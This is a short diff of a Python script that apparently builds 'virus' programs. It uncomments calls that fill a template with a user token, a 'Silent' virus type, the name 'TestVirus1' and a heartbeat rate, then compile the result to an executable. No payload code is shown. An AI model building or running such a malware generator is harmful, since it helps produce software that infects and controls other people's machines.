@@ -170,9 +170,9 @@ def generateScript(user_id, token, virus_type, name, heartbeat_rate):
     with open('generated_script.py', 'w') as f:
         f.write(filled_template)
 
-#generateScript(1, '1234567890', 'Silent', 'TestVirus1', '1h')
+generateScript(1, '1234567890', 'Silent', 'TestVirus1', '1h')
 #compile test
-#generateExe("generated_script.py")
+generateExe("generated_script.py")
 
 # if __name__ == '__main__':
 #     parser = argparse.ArgumentParser(description='Generate a Python script from parameters')
